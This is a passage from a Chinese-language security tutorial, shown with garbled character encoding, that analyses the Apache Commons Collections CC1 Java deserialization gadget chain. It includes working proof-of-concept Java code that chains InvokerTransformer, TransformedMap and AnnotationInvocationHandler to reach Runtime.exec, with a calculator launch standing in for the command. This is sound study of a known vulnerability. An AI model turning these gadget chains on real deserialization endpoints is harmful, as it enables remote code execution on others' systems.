method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var6);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œé€šè¿‡ <code>input.getClass();</code> è·å–å¯¹è±¡ï¼Œç„¶åé€šè¿‡ <code>cls.getMethod(this.iMethodName, this.iParamTypes);</code> ä¼ å…¥æ–¹æ³•åã€æ–¹æ³•çš„çš„å‚æ•°ç±»å‹æ¥è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•ï¼Œä¹‹åé€šè¿‡ <code>method.invoke(input, this.iArgs);</code> æ¥æ‰§è¡Œè¯¥æ–¹æ³•ã€‚è¿™ä¹Ÿå°±æ˜¯å‰é¢<a href="https://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484123&idx=1&sn=598d098ffe19be59547c09538716e196&chksm=c2829bc2f5f512d4e77af3085132c9cf18d9b2fec5abc1c0f6a120561d52be43be29ff0b2a92&scene=0&xtrack=1#rd">åˆæ¢Javaååºåˆ—åŒ–æ¼æ´(äºŒ)</a>ä¸­è¯´è¿‡çš„<strong>Javaåå°„</strong>ã€‚</p>
<p>ä»è¿™é‡Œæˆ‘ä»¬èƒ½çœ‹å‡ºï¼Œ<code>InvokerTransformer</code>è¿™ä¸ªç±»è°ƒç”¨<code>transform</code>å¯ä»¥æ‰§è¡Œä»»æ„æ–¹æ³•ï¼Œè¿™ç‚¹éå¸¸å…³é”®ï¼Œæ˜¯ååºåˆ—åŒ–èƒ½æ‰§è¡Œä»»æ„ä»£ç çš„å…³é”®ã€‚å°è¯•ä½¿ç”¨<code>InvokeTransformer</code>æ¥æ‰§è¡Œå‘½ä»¤ã€‚<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210609205307.png" alt="image-20210609205257230"></p>
<p>æˆ‘ä»¬åœ¨è¿™é‡Œå¯ä»¥å°è¯•è¿›è¡Œåºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„åˆ©ç”¨</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> con.yhy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/6/9 20:47</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// ä½¿ç”¨ InvokerTransformer æ¥æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">invoker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;</span><br><span class="line">        );</span><br><span class="line"><span class="comment">//        invoker.transform(Runtime.getRuntime());</span></span><br><span class="line">        <span class="comment">// å°†invokerTransformerè¿›è¡Œåºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./invoker.bin&quot;</span>));</span><br><span class="line">        outputStream.writeObject(invoker);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ¨¡æ‹Ÿç›®æ ‡åç«¯ç¨‹åºæ¥å—åˆ°çš„åºåˆ—åŒ–åçš„æ•°æ®</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./invoker.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">fin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fi);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer1</span> <span class="operator">=</span> (InvokerTransformer) fin.readObject();</span><br><span class="line">        invokerTransformer1.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610213951.png" alt="image-20210609212210440"></p>
<p>è™½ç„¶æˆåŠŸæ‰§è¡Œï¼Œä½†æ˜¯å•å•åˆ©ç”¨<code>InvokeTransformer</code>ç±»æ¥è¿›è¡Œååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨åœ¨å®æˆ˜ä¸­æ˜¯æ¡ä»¶æå…¶è‹›åˆ»çš„ã€‚</p>
<p>1.ç›®æ ‡å¾—æ°å·§åˆ©ç”¨<code>InvokerTransformer</code>å°†ååºåˆ—åŒ–åçš„æ•°æ®è¿›è¡Œè½¬å‹ã€‚</p>
<p>2.ç›®æ ‡å¾—åœ¨è½¬å‹åï¼Œæ­£å¥½è°ƒç”¨äº†<code>transform</code>ï¼Œå¹¶ä¸”å‚æ•°æ˜¯æ”»å‡»è€…å¯ä»¥æ§åˆ¶çš„ã€‚</p>
<p>è¿™æ ·æ˜¯è¡Œä¸é€šçš„ï¼Œæ‰€ä»¥è¿™ä¸€æ­¥åªèƒ½æ˜¯åˆ©ç”¨é“¾ä¸­çš„ä¸€æ¡çº¿è·¯ï¼Œéœ€è¦ç»§ç»­å¯»æ‰¾å¯ä»¥ç”¨çš„ç‚¹ã€‚</p>
<h3 id="2-4-ChainedTransformer-ç±»"><a href="#2-4-ChainedTransformer-ç±»" class="headerlink" title="2.4 ChainedTransformer ç±»"></a>2.4 ChainedTransformer ç±»</h3><p>è¿™ä¸ªåŒæ ·æ˜¯å®ç°Transformeræ¥å£çš„ä¸€ä¸ªç±»ï¼Œä¹Ÿæ˜¯å®ç°äº†<code>Serializable</code>æ¥å£<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210609202448.png" alt="image-20210608210704229"></p>
<p>åªæœ‰ä¸ªæ¥æ”¶æ•°ç»„ï¼Œæ•°ç»„ä¸­å…ƒç´ ç±»å‹ä¸º<code>Transformer</code>çš„ä¸€ä¸ªæœ‰å‚æ„é€ æ–¹æ³•ã€‚è¿™é‡Œå®ç°çš„<code>transform</code>æ–¹æ³•çš„ä½œç”¨æ˜¯ï¼šéå†æ‰§è¡Œä¼ å…¥æ•°ç»„å…ƒç´ çš„<code>transform</code>æ–¹æ³•ï¼ŒåŒæ—¶å°†ä¸Šä¸ªå…ƒç´ çš„è¿”å›å¯¹è±¡ä½œä¸ºsä¸‹ä¸ªå…ƒç´ <code>transform</code>æ–¹æ³•ä¸­çš„å‚æ•°ã€‚</p>
<h3 id="2-5-TransformedMap-ç±»"><a href="#2-5-TransformedMap-ç±»" class="headerlink" title="2.5 TransformedMap ç±»"></a>2.5 TransformedMap ç±»</h3><p>TransformedMap è¿™ä¸ªç±»æ˜¯ç”¨æ¥å¯¹ Map è¿›è¡ŒæŸäº›å˜æ¢ç”¨çš„ï¼Œä¾‹å¦‚å½“æˆ‘ä»¬ä¿®æ”¹Mapä¸­çš„æŸä¸ªå€¼æ—¶ï¼Œå°±ä¼šè§¦å‘æˆ‘ä»¬é¢„å…ˆå®šä¹‰å¥½çš„æŸäº›æ“ä½œæ¥å¯¹Mapè¿›è¡Œå¤„ç†ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, keyTransformer, valueTransformer);</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡<code>decorate</code>å‡½æ•°å°±å¯ä»¥å°†ä¸€ä¸ªæ™®é€šçš„ Map è½¬æ¢ä¸ºä¸€ä¸ª<code>TransformedMap</code>ã€‚ç¬¬äºŒä¸ªå‚æ•°å’Œç¬¬ä¸‰ä¸ªå‚æ•°åˆ†åˆ«å¯¹åº”å½“keyæ”¹å˜å’Œvalueæ”¹å˜æ—¶éœ€è¦åšçš„æ“ä½œï¼Œéƒ½æ˜¯<code>Transformer</code>ç±»å‹ï¼Œå®ç°<code>transform(Object input)</code>æ–¹æ³•å³å¯è¿›è¡Œå®é™…çš„å˜æ¢æ“ä½œï¼ŒæŒ‰ç…§å¦‚ä¸Šä»£ç ç”Ÿæˆ<code>transformedMap</code>åï¼Œå¦‚æœä¿®æ”¹äº†å…¶ä¸­çš„ä»»æ„keyæˆ–valueï¼Œéƒ½ä¼šè°ƒç”¨å¯¹åº”çš„<code>transform</code>æ–¹æ³•å»è¿›è¡Œä¸€äº›å˜æ¢æ“ä½œã€‚</p>
<p>åŠ¨æ‰‹å®éªŒä¸€ä¸‹ï¼Œå¸®åŠ©ç†è§£</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> con.yhy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/6/8 21:25</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// å½“map ä¸­çš„ key å˜åŠ¨æ—¶ï¼Œè¾“å‡ºä¸€å¥è¯</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">KeyUpdate</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;key update&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMapTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">KeyUpdate</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, transformer, <span class="literal">null</span>);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘é€šè¿‡å®ç°äº†ä¸€ä¸ªå½“ map ä¸­çš„ key å˜åŠ¨æ—¶ï¼Œè¾“å‡ºä¸€å¥è¯çš„åŠŸèƒ½ã€‚<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210609202500.png" alt="image-20210608213206466"></p>
<h2 id="0x03-æ¢³ç†Pç‰›ç®€åŒ–åçš„åˆ©ç”¨é“¾"><a href="#0x03-æ¢³ç†Pç‰›ç®€åŒ–åçš„åˆ©ç”¨é“¾" class="headerlink" title="0x03 æ¢³ç†Pç‰›ç®€åŒ–åçš„åˆ©ç”¨é“¾"></a>0x03 æ¢³ç†Pç‰›ç®€åŒ–åçš„åˆ©ç”¨é“¾</h2><p>ç»è¿‡ä¸Šé¢çš„é€è¡Œåˆ†æï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥å¤è¿°ä¸€ä¸‹Demoçš„è¿è¡Œé€»è¾‘ï¼šé€šè¿‡åˆ›å»ºäº†ä¸€ä¸ª<code>ChainedTransformer</code>ï¼Œå‘å…¶ä¸­ä¼ å…¥ä¸€ä¸ª<code>Transformer</code>ç±»å‹çš„æ•°ç»„ï¼Œè¯¥æ•°ç»„ä¸­æœ‰ä¸¤ä¸ªå…ƒç´ ï¼šç¬¬ä¸€ä¸ªæ˜¯<code>ConstantTransformer</code>;ç¬¬äºŒä¸ªæ˜¯<code>InvokerTransformer</code>ã€‚</p>
<p>å› ä¸º<code>TransformedMap.decorate()</code> ä¼šåœ¨ map ä¸­ key æˆ–è€… value æ”¹å˜æ—¶ï¼Œå»æ‰§è¡Œæ—¶è°ƒç”¨å¯¹åº”çš„<code>transformer</code>æ–¹æ³•ï¼Œè€Œ<code>ChainedTransformer</code>å¯¹è±¡çš„ <code>transform</code>æ–¹æ³•æ˜¯éå†æ‰§è¡Œä¼ å…¥å‚æ•°çš„<code>transform</code>æ–¹æ³•ã€‚</p>
<p>æ‰€ä»¥å½“ map ä¸­ key æˆ–è€… value æ”¹å˜æ—¶ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ <code>ConstantTransformer</code>ä¼šè°ƒç”¨<code>transform</code>æ–¹æ³•è¿”å›å½“å‰ç¯å¢ƒçš„<code>Runtime</code>å¯¹è±¡ï¼Œç„¶åå°†<code>Runtime</code>å¯¹è±¡ä½œä¸ºæ•°ç»„ç¬¬äºŒä¸ªå…ƒç´ çš„<code>transform</code>æ–¹æ³•çš„å‚æ•°ï¼Œè€Œ<code>InvokerTransformer</code>çš„<code>transform</code>æ–¹æ³•æ˜¯é€šè¿‡åå°„æ‰§è¡Œä¼ å…¥å¯¹è±¡çš„æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ä¸‹é¢çš„ä¸€ä¸ªè¿‡ç¨‹ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> con.yhy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/6/8 22:00</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reflect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">input</span> <span class="operator">=</span> Runtime.getRuntime(); 	<span class="comment">// ç¬¬ä¸€ä¸ªæ•°ç»„å…ƒç´ çš„æ‰§è¡Œè¿”å›ç»“æœ</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;);</span><br><span class="line">        method.invoke(input, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;); <span class="comment">// åå°„æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ€åé€šè¿‡ <code>outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</code> æ—¶ï¼Œè§¦å‘<code>TransformedMap.decorate()</code>æ–¹æ³•ï¼Œæ‰§è¡Œä¸Šé¢ä¸€ç³»åˆ—è¿‡ç¨‹æ‰“å¼€è®¡ç®—å™¨ï¼Œå³æ‰§è¡Œå‘½ä»¤ã€‚<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210609202508.png" alt="image-20210608221034991"></p>
<p>ä¸Šè¿°è¿‡ç¨‹å¹¶æ²¡æœ‰ååºåˆ—åŒ–ç›¸å…³çš„é“¾ï¼Œåªæ˜¯ä¸€ä¸ªæœ¬åœ°è¿è¡Œçš„Demoï¼Œæ–¹ä¾¿å­¦ä¹ CommonCollectionsåˆ©ç”¨é“¾çš„æ‰§è¡Œæµç¨‹ã€‚è€Œåœ¨å®é™…çš„ååºåˆ—åŒ–æ¼æ´ä¸­ï¼Œæˆ‘ä»¬éœ€è¦å°†ä¸Šé¢æœ€ç»ˆç”Ÿæˆçš„outerMapå¯¹è±¡å˜æˆä¸€ä¸ªåºåˆ—åŒ–æµã€‚</p>
<h2 id="0x04-é€šè¿‡ååºåˆ—åŒ–æ‰§è¡Œè§¦å‘æ¼æ´"><a href="#0x04-é€šè¿‡ååºåˆ—åŒ–æ‰§è¡Œè§¦å‘æ¼æ´" class="headerlink" title="0x04 é€šè¿‡ååºåˆ—åŒ–æ‰§è¡Œè§¦å‘æ¼æ´"></a>0x04 é€šè¿‡ååºåˆ—åŒ–æ‰§è¡Œè§¦å‘æ¼æ´</h2><p>ä¸Šé¢çš„ Demo éœ€è¦æˆ‘ä»¬æ‰‹å·¥æ‰§è¡Œæ”¹å˜ map ä¸­çš„ key çš„å€¼ï¼Œä¹Ÿå°±æ˜¯æ‰‹åŠ¨æ‰§è¡Œ <code>outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</code>æ‰å¯ä»¥è§¦å‘å‘½ä»¤æ‰§è¡Œï¼Œä½†åœ¨å®é™…çš„åº”ç”¨ä¸­ï¼Œä¸å¯èƒ½è®©æˆ‘ä»¬æ‰‹åŠ¨æ‰§è¡Œï¼Œæ‰€ä»¥éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå®ç°äº†<code>Serializable</code>çš„ç±»ï¼Œå®ƒåœ¨ååºåˆ—åŒ–çš„readObjecté€»è¾‘é‡Œæœ‰ç±»ä¼¼çš„å†™å…¥æ“ä½œã€‚</p>
<p>è¿™é‡Œé…åˆæˆ‘ä»¬æ‰§è¡Œä»£ç çš„ç±»å°±æ˜¯<code>sun.reflect.annotation.AnnotationInvocationHandler</code>ï¼Œè¯¥ç±»æ˜¯javaè¿è¡Œåº“ä¸­çš„ä¸€ä¸ªç±»ï¼Œå®ç°äº†<code>Serializable</code>æ¥å£ï¼Œå¹¶ä¸”åŒ…å«ä¸€ä¸ª<code>Map</code>å¯¹è±¡å±æ€§ï¼Œå…¶<code>readObject</code>æ–¹æ³•æœ‰è‡ªåŠ¨ä¿®æ”¹è‡ªèº«Mapå±æ€§çš„æ“ä½œã€‚</p>
<blockquote>
<p>  è‡³äºä¸ºä»€ä¹ˆæœ€ç»ˆä¼šæ‰¾åˆ°çš„è¿™ä¸ªç±»ï¼Œæˆ‘å°±ä¸æ¸…æ¥šäº†ï¼Œåº”è¯¥éœ€è¦å¯¹ java çš„å„ç§ç±»éƒ½æœ‰ä¸ªè¯¦ç»†çš„äº†è§£ã€‚åŸºäºæ­¤æˆ‘æœ‰ä¸ªideaï¼Œæ¥å¸®åŠ©å¿«é€Ÿå¯»æ‰¾å¯èƒ½å­˜åœ¨çš„åˆ©ç”¨é“¾</p>
</blockquote>
<p>æˆ‘ä»¬çœ‹ä¸‹<code>jre/lib/rt.jar!/sun/reflect/annotation/AnnotationInvocationHandler.class</code>è¿™ä¸ªç±»(jdk1.7.0_80)<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214036.png" alt="image-20210610075434821"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214042.png" alt="image-20210610082647689"></p>
<p>åœ¨<code>readObject</code>ä¸­éå†äº† map ,ç„¶ååœ¨<code>var5.setValue()</code>ä¼šæ”¹å˜mapä¸­çš„ valueï¼Œå¹¶ä¸”<strong>var2</strong> å’Œ<strong>var4</strong>çš„å€¼æ˜¯å¯æ§çš„ï¼Œéƒ½å¯ä»¥åœ¨æ„é€ æ–¹æ³•ä¸­è®¾ç½®<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214048.png" alt="image-20210610082847106"></p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ª<code>AnnotationInvocationHandler</code>å¯¹è±¡ï¼Œå°†ä¹‹å‰æ„é€ çš„POCæ”¾å…¥<code>AnnotationInvocationHandler</code>å¯¹è±¡ä¸­ï¼Œå½“ç›®æ ‡å­˜åœ¨ååºåˆ—åŒ–æ¼æ´æ—¶ï¼Œå°±ä¼šè‡ªåŠ¨è§¦å‘<code>setValue</code>æ“ä½œæ”¹å˜mapä¸­çš„valueçš„å€¼ï¼Œä»è€Œè§¦å‘ä¸Šé¢åˆ†æçš„è¿‡ç¨‹ï¼Œæ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>å› ä¸ºAnnotationInvocationHandleræ˜¯ä¸€ä¸ªå†…éƒ¨ç±»ï¼Œä¸èƒ½é€šè¿‡newæ¥å®ä¾‹åŒ–ï¼Œæ‰€ä»¥éœ€è¦ç”¨åˆ°åå°„æ¥è·å–å¯¹è±¡</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="comment">// å› ä¸ºAnnotationInvocationHandleråªæœ‰ä¸ªç§æœ‰çš„æœ‰å‚æ„é€ ï¼Œæ‰€ä»¥éœ€è¦getDeclaredConstructorè·å–</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"><span class="comment">//è®¾ç½®æ‰€æœ‰çš„æˆå‘˜éƒ½å¯ä»¥è®¿é—®</span></span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// è·å–å¯¹è±¡ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªAnnotationç±»; ç¬¬äºŒä¸ªæ˜¯å‚æ•°å°±æ˜¯å‰é¢æ„é€ çš„Mapã€‚</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Retention.class,outerMap);</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°†ä»£ç æ‹¼æ¥ï¼Œå¹¶æ¨¡æ‹Ÿä¸€ä¸‹åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½è‡ªåŠ¨è§¦å‘å‘½ä»¤æ‰§è¡Œ<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214056.png" alt="image-20210610083441461"></p>
<p>å‡ºé”™ï¼Œè¿™æ˜¯å› ä¸º<code>Runtime</code>æ²¡æœ‰ç»§æ‰¿<code>Serializer</code>æ¥å£ï¼Œæ˜¯æ— æ³•è¿›è¡Œåºåˆ—åŒ–çš„ï¼Œæ‰€ä»¥éœ€è¦åå°„è·å–<code>Runtime</code>å¯¹è±¡ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> con.yhy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/6/10 08:06</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        outerMap.put(&quot;test&quot;, 